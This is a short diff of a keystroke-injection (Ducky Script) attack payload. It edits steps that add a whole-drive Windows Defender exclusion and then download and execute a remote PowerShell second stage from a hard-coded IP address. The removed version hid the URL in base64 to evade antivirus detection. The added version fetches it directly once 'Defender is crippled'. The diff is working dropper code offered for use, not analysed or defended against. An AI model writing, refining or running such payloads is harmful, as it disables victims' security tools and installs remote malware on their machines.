@@ -78,8 +78,8 @@ REM ── Step 13: Add full drive exclusion ──
 STRINGLN Add-MpPreference -ExclusionPath 'C:\'
 DELAY 500
 
-REM ── Step 14: Pull stage2.ps1 encoded to bypass AV string detection ──
-STRINGLN powershell -c "$u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aHR0cDovLzE1My43NS44Mi4xOTgvc3RhZ2UyLnBzMQ=='));IEX (New-Object Net.WebClient).DownloadString($u)"
+REM ── Step 14: Direct pull now that Defender is crippled ──
+STRINGLN IEX(New-Object Net.WebClient).DownloadString('http://153.75.82.198/stage2.ps1')
 DELAY 1000
 
 
